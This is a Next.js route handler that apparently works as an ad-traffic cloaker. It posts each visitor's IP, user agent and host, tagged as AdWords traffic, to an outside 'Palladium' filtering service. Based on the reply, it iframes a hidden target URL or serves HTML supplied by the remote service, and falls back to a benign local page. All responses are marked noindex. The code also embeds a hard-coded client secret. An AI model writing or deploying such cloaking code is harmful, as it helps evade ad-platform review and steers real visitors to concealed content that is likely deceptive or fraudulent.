import { NextRequest, NextResponse } from 'next/server';
import path from 'path';
import fs from 'fs/promises';

function flattenPayload(obj: Record<string, unknown>, prefix = ''): Record<string, string> {
  return Object.entries(obj).reduce((acc, [key, val]) => {
    const newKey = prefix ? `${prefix}[${key}]` : key;
    if (typeof val === 'object' && val !== null && !Array.isArray(val)) {
      Object.assign(acc, flattenPayload(val as Record<string, unknown>, newKey));
    } else {
      acc[newKey] = String(val);
    }
    return acc;
  }, {} as Record<string, string>);
}

const PALLADIUM_URL = 'https://rbl.palladium.expert';

export async function GET(req: NextRequest) {
  const ip = req.nextUrl.searchParams.get('ip') || '8.8.8.8';
  const ua = req.nextUrl.searchParams.get('ua') || '';
  const host = req.headers.get('host') || '';

  const payload = flattenPayload({
    server: {
      REMOTE_ADDR: ip,
      'User-Agent': ua,
      Host: host,
      HTTP_HOST: host,
      REQUEST_TIME_FLOAT: Date.now() / 1000,
      SERVER_PORT: '443',
      bannerSource: 'adwords',
    },
    auth: {
      clientId: 3024,
      clientCompany: 'wYAKkDCo7dqqcZyeDnUN',
      clientSecret:
        'MzAyNHdZQUtrRENvN2RxcWNaeWVEblVOY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
    },
  });

  try {
    const res = await fetch(PALLADIUM_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams(payload),
    });

    const result = await res.json();

    if (result?.result) {
      const { mode, target, content } = result;

      if (mode === 1 && target) {
        const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="noindex"></head><body style="margin:0"><iframe src="${target}" style="width:100%;height:100vh;border:none;"></iframe></body></html>`;
        return new NextResponse(html, {
          status: 200,
          headers: {
            'Content-Type': 'text/html',
            'X-Robots-Tag': 'noindex',
          },
        });
      }

      if (mode === 4 && content) {
        return new NextResponse(content, {
          status: 200,
          headers: {
            'Content-Type': 'text/html',
            'X-Robots-Tag': 'noindex',
          },
        });
      }
    }
  } catch (error) {
    console.error('[PALLADIUM] Error:', error);
  }

  try {
    const filePath = path.resolve('src/assets/new_spain/index.html');
    const html = await fs.readFile(filePath, 'utf8');
    return new NextResponse(html, {
      status: 200,
      headers: {
        'Content-Type': 'text/html',
        'X-Robots-Tag': 'noindex',
      },
    });
  } catch {
    return new NextResponse('Fallback failed', { status: 500 });
  }
}
